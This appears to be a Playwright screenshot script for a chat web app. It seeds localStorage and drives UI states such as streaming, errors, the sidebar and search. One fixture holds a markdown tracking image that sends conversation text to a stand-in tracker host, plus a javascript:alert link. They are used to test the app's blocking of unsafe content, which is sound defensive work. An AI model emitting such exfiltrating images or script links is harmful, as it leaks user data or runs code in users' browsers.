// Screenshot driver: seeds localStorage per state, drives the real UI
// against the mock endpoint, saves PNGs into shots/.
// Usage: npm run dev (port 5173) + node scripts/mock-server.mjs running,
// then: node scripts/shots.mjs [name ...]  (default: all)
// States assert their markers (must()) — a missing state FAILS, never a PNG.
import { chromium } from "@playwright/test";

const APP = "http://localhost:5173";
const CONV_KEY = "crescent-chat.conversations.v1";
const SET_KEY = "crescent-chat.settings.v1";
const THEME_KEY = "crescent-chat.theme.v1";
const INDEX_KEY = "crescent-chat.index.v2";

const okSettings = (model) => ({
  endpoint: "http://127.0.0.1:18081/ok",
  token: "shot-token",
  model,
});

let n = 0;
function uid() {
  n++;
  return `shot-${Date.now()}-${n}`;
}
function msg(role, content, extra = {}) {
  return { id: uid(), role, content, createdAt: Date.now(), ...extra };
}
function conv(title, messages, count) {
  return {
    id: uid(),
    title,
    createdAt: Date.now() - (count ?? 0) * 1000,
    updatedAt: Date.now() - (count ?? 0) * 1000,
    messages,
  };
}

const LONG_TITLES = [
  "Why do sourdough starters rise faster in summer kitchens",
  "Q3",
  "A very long conversation title about refactoring the billing pipeline without breaking invoices",
  "Ideas",
  "Notes from the call with the accountant about quarterly taxes and receipts",
  "Hi",
  "Planning the autumn hiking trip across the Dolomites with friends",
  "Todo",
  "Understanding how mortgages work when rates keep moving every month",
  "X",
  "Draft of the resignation letter I will probably never send to anyone",
  "Books",
  "What to cook with five ingredients and one tired evening after work",
  "Fix",
  "The complete history of the office plant and who actually waters it",
  "OK",
  "Comparing electricity tariffs before winter arrives and prices change",
  "Hmm",
  "A short story about a lighthouse keeper who collected lost letters",
  "Zzz",
];

function twentyConvos() {
  return LONG_TITLES.map((t, i) =>
    conv(t, [msg("user", `Message ${i + 1}`), msg("assistant", `Reply ${i + 1}.`)], 20 - i),
  );
}

function longConvo() {
  const messages = [];
  for (let i = 0; i < 100; i++) {
    messages.push(msg("user", `Question number ${i + 1}: what should I keep in mind?`));
    messages.push(
      msg(
        "assistant",
        `Answer ${i + 1}: keep the measure narrow, the turns airy, and the scroll pinned unless you moved it. ` +
          `This is filler text standing in for two hundred real messages.`,
      ),
    );
  }
  return [conv("A very long conversation with two hundred messages inside it", messages)];
}

const SEEDED_THREAD = [
  conv("Seeded thread", [
    msg("user", "What does the dark side look like?"),
    msg(
      "assistant",
      "Like this: a [link](https://example.com), some `inline code`, and a block:\n\n```python\ndef greet(name: str) -> str:\n    return f\"Hello, {name}!\"\n```\n\n| A | B |\n| --- | --- |\n| 1 | 2 |\n",
    ),
  ]),
];

async function seed(page, { settings = null, convos = [], theme = "light", v2 = null }) {
  await page.addInitScript(
    ({ cKey, sKey, tKey, iKey, settings, convos, theme, v2 }) => {
      localStorage.clear();
      localStorage.setItem(tKey, theme);
      if (document.documentElement) document.documentElement.dataset.theme = theme;
      if (settings) localStorage.setItem(sKey, JSON.stringify(settings));
      // v1 seed (migration path) or v2 index+payloads, or legacy v1 list.
      if (v2) {
        localStorage.setItem(iKey, JSON.stringify(v2.index));
        for (const [id, messages] of v2.payloads) {
          localStorage.setItem(`crescent-chat.msgs.${id}.v2`, JSON.stringify(messages));
        }
        localStorage.setItem("crescent-chat.migrated.v2", "1");
      } else if (convos.length) {
        localStorage.setItem(cKey, JSON.stringify(convos));
      }
    },
    { cKey: CONV_KEY, sKey: SET_KEY, tKey: THEME_KEY, iKey: INDEX_KEY, settings, convos, theme, v2 },
  );
}

/** Fail-loud marker: the state must be on screen before any screenshot. */
async function must(page, selector, label) {
  await page.locator(selector).first().waitFor({ timeout: 8000 });
}

async function shot(page, path) {
  await page.waitForTimeout(600);
  await page.screenshot({ path });
  console.log("saved", path);
}

/** Open a conversation from the sidebar by title substring. */
async function openConvo(page, titlePart) {
  // Narrow windows keep the list in a closed drawer: open it first.
  const toggle = page.getByRole("button", { name: "Show conversations", exact: true });
  if (await toggle.isVisible()) await toggle.click();
  await page
    .locator(".sidebar")
    .getByRole("button", { name: new RegExp(titlePart.slice(0, 24), "i") })
    .first()
    .click();
  await page.waitForTimeout(400);
}

async function main() {
  const only = new Set(process.argv.slice(2));
  const want = (name) => only.size === 0 || only.has(name);
  const browser = await chromium.launch({ args: ["--no-sandbox"] });

  if (want("empty")) {
    const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
    await seed(page, {});
    await page.goto(APP);
    await must(page, ".empty-title", "empty");
    await shot(page, "shots/01-empty.png");
    await page.close();
  }

  if (want("empty-dark")) {
    const page = await browser.newPage({ viewport: { width: 1280, height: 800 } });
    await seed(page, { theme: "dark" });
    await page.goto(APP);
    await must(page, ".empty-title", "empty-dark");
    await shot(page, "shots/01-empty-dark.png");
    await page.close();
  }

  if (want("streaming")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("slow-demo"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Show me the snippets.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(1100);
    await page.getByRole("button", { name: /Show sections/ }).click();
    await must(page, ".crescent-nav-open", "streaming nav");
    await shot(page, "shots/02-streaming.png");
    await page.close();
  }

  if (want("heavy")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("heavy-demo"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Show me everything.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("in one answer"),
      null,
      { timeout: 20000 },
    );
    await shot(page, "shots/04-heavy.png");
    await page.close();
  }

  if (want("denied")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/denied", token: "wrong", model: "x" },
      theme: "light",
    });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Hello?");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("did not accept the key"),
      null,
      { timeout: 20000 },
    );
    await shot(page, "shots/05-denied.png");
    await page.close();
  }

  if (want("stopped")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("slow-demo"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Tell me slowly.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(2000);
    await page.getByRole("button", { name: "Stop generating" }).click();
    await page.waitForTimeout(800);
    await must(page, ".row-note", "stopped note");
    await shot(page, "shots/06-stopped.png");
    await page.close();
  }

  if (want("code")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("code-demo"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Show me the snippets.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("scrolls horizontally"),
      null,
      { timeout: 20000 },
    );
    await shot(page, "shots/03-code.png");
    await page.close();
  }

  if (want("long")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: longConvo(), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1500);
    await openConvo(page, "very long conversation");
    await must(page, ".thread", "long thread");
    await shot(page, "shots/08-long.png");
    await page.close();
  }

  if (want("narrow")) {
    const page = await browser.newPage({ viewport: { width: 700, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: SEEDED_THREAD, theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Seeded thread");
    await shot(page, "shots/09-narrow.png");
    await page.close();
  }

  if (want("wide")) {
    const page = await browser.newPage({ viewport: { width: 1800, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: SEEDED_THREAD, theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Seeded thread");
    await shot(page, "shots/10-wide.png");
    await page.close();
  }

  if (want("darkthread")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: SEEDED_THREAD, theme: "dark" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Seeded thread");
    await shot(page, "shots/11-dark-thread.png");
    await page.close();
  }

  if (want("thinking")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("patient-demo"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Take your time.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(700);
    await must(page, ".thinking", "thinking dots");
    await shot(page, "shots/12-thinking.png");
    await page.close();
  }

  if (want("darkdenied")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/denied", token: "wrong", model: "x" },
      theme: "dark",
    });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Hello?");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("did not accept the key"),
      null,
      { timeout: 20000 },
    );
    await shot(page, "shots/13-dark-denied.png");
    await page.close();
  }

  if (want("copyconfirm")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: SEEDED_THREAD, theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Seeded thread");
    await page.getByRole("button", { name: "Copy" }).click();
    await must(page, ".codeblock-copy", "copy button");
    await shot(page, "shots/14-copied.png");
    await page.close();
  }

  if (want("paste")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    const big = Array.from({ length: 5000 }, (_, i) => `pasted line ${i + 1}`).join("\n");
    await page.getByRole("textbox", { name: "Message" }).fill(big);
    await shot(page, "shots/15-paste.png");
    await page.close();
  }

  if (want("reduced")) {
    const page = await browser.newPage({
      viewport: { width: 1400, height: 900 },
      reducedMotion: "reduce",
    });
    await seed(page, { settings: okSettings("slow-demo"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Tell me slowly.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(2500);
    await shot(page, "shots/16-reduced.png");
    await page.close();
  }

  if (want("focus")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("hello");
    await page.getByRole("textbox", { name: "Message" }).press("Tab");
    await shot(page, "shots/20-focus.png");
    await page.close();
  }

  if (want("recover")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {
      settings: { endpoint: "http://127.0.0.1:18081/denied", token: "wrong", model: "code-demo" },
      theme: "light",
    });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("textbox", { name: "Message" }).fill("Show me the snippets.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("did not accept the key"),
      null,
      { timeout: 20000 },
    );
    await page.locator(".error-block").getByRole("button", { name: "Open settings" }).click();
    await page.getByPlaceholder("https://my-server:8000").fill("http://127.0.0.1:18081/ok");
    await page.getByRole("button", { name: "Save", exact: true }).click();
    await page.getByRole("button", { name: /Show sections/ }).click();
    await page.getByRole("button", { name: "Open Chat" }).click();
    await page.getByRole("button", { name: "Try again" }).click();
    await page.waitForFunction(
      () => document.querySelector(".thread")?.textContent?.includes("scrolls horizontally"),
      null,
      { timeout: 20000 },
    );
    await shot(page, "shots/21-recover.png");
    await page.close();
  }

  if (want("switch")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("slow-demo"), convos: SEEDED_THREAD, theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Seeded thread");
    await page.getByRole("button", { name: "+ New chat" }).click();
    await page.getByRole("textbox", { name: "Message" }).fill("Second topic, slowly.");
    await page.getByRole("textbox", { name: "Message" }).press("Enter");
    await page.waitForTimeout(1200);
    await openConvo(page, "Seeded thread");
    await must(page, ".thread", "switched thread");
    await shot(page, "shots/22-switch.png");
    await page.close();
  }

  if (want("missing")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    const tail = conv("Interrupted thread", [
      msg("user", "Are you still there?"),
      { ...msg("assistant", ""), createdAt: Date.now() },
    ]);
    await seed(page, { settings: okSettings("x"), convos: [tail], theme: "light" });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Interrupted thread");
    await must(page, ".error-block", "missing tail");
    await shot(page, "shots/26-missing.png");
    await page.close();
  }

  // --- giro 18: sidebar, surfaces, blocked images ---

  if (want("sidebar")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: twentyConvos().slice(0, 8) });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Todo");
    await must(page, ".sidebar-row-active", "active row");
    await shot(page, "shots/40-sidebar.png");
    await page.close();
  }

  if (want("search")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: twentyConvos() });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByLabel("Search conversations").fill("taxes");
    await page.waitForTimeout(400);
    await must(page, ".sidebar-row", "search hit");
    await shot(page, "shots/41-search.png");
    await page.close();
  }

  if (want("rename")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: twentyConvos().slice(0, 3) });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.locator(".sidebar-row").first().hover();
    await page.getByRole("button", { name: "Rename" }).first().click();
    await must(page, ".sidebar-rename", "rename input");
    await shot(page, "shots/42-rename.png");
    await page.close();
  }

  if (want("settingssurface")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {});
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("button", { name: /Show sections/ }).click();
    await page.locator(".crescent-shell").getByRole("button", { name: "Open Settings" }).click();
    await must(page, ".settings-page", "settings surface");
    await shot(page, "shots/43-settings-surface.png");
    await page.close();
  }

  if (want("drawer")) {
    const page = await browser.newPage({ viewport: { width: 700, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: twentyConvos().slice(0, 8) });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("button", { name: "Show conversations", exact: true }).click();
    await must(page, ".sidebar-open", "drawer");
    await shot(page, "shots/44-drawer.png");
    await page.close();
  }

  if (want("imgblocked")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        conv("Sneaky model", [
          msg("user", "Show me a picture."),
          msg(
            "assistant",
            "Here:\n\n![tracker](https://tracker.example/pixel.gif?c=secret-talk)\n\nAnd [evil](javascript:alert(1)).",
          ),
        ]),
      ],
    });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await openConvo(page, "Sneaky model");
    await must(page, ".blocked-image", "blocked notice");
    await shot(page, "shots/45-imgblocked.png");
    await page.close();
  }

  if (want("groups")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    const day = 86_400_000;
    const now = Date.now();
    const aged = (title, ageMs, i) => ({
      ...conv(title, [msg("user", `Message ${i}`), msg("assistant", `Reply ${i}.`)]),
      createdAt: now - ageMs,
      updatedAt: now - ageMs,
    });
    await seed(page, {
      settings: okSettings("x"),
      convos: [
        aged("Bought milk today", 1000, 1),
        aged("Called yesterday", day + 1000, 2),
        aged("Planned this week", 3 * day, 3),
        aged("Old notes", 10 * day, 4),
      ],
    });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await must(page, ".sidebar-group", "groups");
    await shot(page, "shots/47-groups.png");
    await page.close();
  }

  if (want("surfaces")) {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    await seed(page, { settings: okSettings("x"), convos: SEEDED_THREAD });
    await page.goto(APP);
    await page.waitForTimeout(1200);
    await page.getByRole("button", { name: /Show sections/ }).click();
    await must(page, ".crescent-nav-open", "surfaces nav");
    await shot(page, "shots/46-surfaces.png");
    await page.close();
  }

  await browser.close();
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
